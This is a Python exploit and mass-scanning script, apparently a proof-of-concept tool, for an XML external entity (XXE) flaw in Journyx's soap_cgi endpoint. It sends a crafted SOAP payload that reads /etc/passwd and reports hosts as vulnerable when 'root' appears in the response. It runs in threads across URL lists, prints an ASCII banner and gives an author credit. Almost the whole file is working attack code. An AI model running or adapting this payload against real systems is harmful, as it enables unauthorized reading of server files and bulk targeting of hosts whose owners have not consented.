import requests
import argparse
import threading
import sys


def SMH(url,result):
    create_url = url+"/jtcgi/soap_cgi.pyc"

    data = '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>'''
    # 构造的xml文档中存在file协议读取文件
    headers = {"User-Agent":"curl/8.1.2",
             "Content-Type":"application/x-www-form-urlencoded",
             "Accept-Ldwk":"bG91ZG9uZ3dlbmt1",
               "Accept":"*/*",
             "Content-Length":"333"}

    try:
        req = requests.post(create_url,data=data,headers=headers,timeout=5)
        # print(req.text) 测试响应包中返回的数据
        if(req.status_code==200):
            if "root" in req.text:
                print(f"【+】{url}存在相关XML外部实体注入漏洞")
                result.append(url)
            else:
                print(f"【-】{url}不存在相关XML外部实体注入漏洞")
    except:
        print(f"【-】{url}无法访问或网络连接错误")

def SMH_counts(filename):
    result = []
    try:
        with open(filename,"r") as file:
            urls = file.readlines()
            threads = []
            for url in urls:
                url = url.strip()
                thread = threading.Thread(target=SMH,args=(url,result))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()

        if result:
            print("\n存在XML外部实体注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
        else:
            print("\n未发现任何存在XML外部实体注入漏洞的URL。")
    except Exception as e:
        print(f"发生错误: {str(e)}")

def start():
    logo='''          _____                   _______                   _____                    _____                    _____                _____                                  
         /\    \                 /::\    \                 /\    \                  /\    \                  /\    \              |\    \                 ______          
        /::\    \               /::::\    \               /::\____\                /::\    \                /::\____\             |:\____\               |::|   |         
        \:::\    \             /::::::\    \             /:::/    /               /::::\    \              /::::|   |             |::|   |               |::|   |         
         \:::\    \           /::::::::\    \           /:::/    /               /::::::\    \            /:::::|   |             |::|   |               |::|   |         
          \:::\    \         /:::/~~\:::\    \         /:::/    /               /:::/\:::\    \          /::::::|   |             |::|   |               |::|   |         
           \:::\    \       /:::/    \:::\    \       /:::/    /               /:::/__\:::\    \        /:::/|::|   |             |::|   |               |::|   |         
           /::::\    \     /:::/    / \:::\    \     /:::/    /               /::::\   \:::\    \      /:::/ |::|   |             |::|   |               |::|   |         
  _____   /::::::\    \   /:::/____/   \:::\____\   /:::/    /      _____    /::::::\   \:::\    \    /:::/  |::|   | _____       |::|___|______         |::|   |         
 /\    \ /:::/\:::\    \ |:::|    |     |:::|    | /:::/____/      /\    \  /:::/\:::\   \:::\____\  /:::/   |::|   |/\    \      /::::::::\    \  ______|::|___|___ ____ 
/::\    /:::/  \:::\____\|:::|____|     |:::|    ||:::|    /      /::\____\/:::/  \:::\   \:::|    |/:: /    |::|   /::\____\    /::::::::::\____\|:::::::::::::::::|    |
\:::\  /:::/    \::/    / \:::\    \   /:::/    / |:::|____\     /:::/    /\::/   |::::\  /:::|____|\::/    /|::|  /:::/    /   /:::/~~~~/~~      |:::::::::::::::::|____|
 \:::\/:::/    / \/____/   \:::\    \ /:::/    /   \:::\    \   /:::/    /  \/____|:::::\/:::/    /  \/____/ |::| /:::/    /   /:::/    /          ~~~~~~|::|~~~|~~~      
  \::::::/    /             \:::\    /:::/    /     \:::\    \ /:::/    /         |:::::::::/    /           |::|/:::/    /   /:::/    /                 |::|   |         
   \::::/    /               \:::\__/:::/    /       \:::\    /:::/    /          |::|\::::/    /            |::::::/    /   /:::/    /                  |::|   |         
    \::/    /                 \::::::::/    /         \:::\__/:::/    /           |::| \::/____/             |:::::/    /    \::/    /                   |::|   |         
     \/____/                   \::::::/    /           \::::::::/    /            |::|  ~|                   |::::/    /      \/____/                    |::|   |         
                                \::::/    /             \::::::/    /             |::|   |                   /:::/    /                                  |::|   |         
                                 \::/____/               \::::/    /              \::|   |                  /:::/    /                                   |::|   |         
                                  ~~                      \::/____/                \:|   |                  \::/    /                                    |::|___|         
                                                           ~~                       \|___|                   \/____/                                      ~~              
'''
    print(logo)
    print("脚本由 YZX100 编写")

def main():
    parser = argparse.ArgumentParser(description="Journyx 存在XML外部实体注入漏洞")
    parser.add_argument('-u',type=str,help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        result = []
        SMH(args.u, result)
        if result:
            print("\n存在XML外部实体注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
    elif args.f:
        SMH_counts(args.f)
    else:
        parser.print_help()


if __name__ == "__main__":
    start()
    main()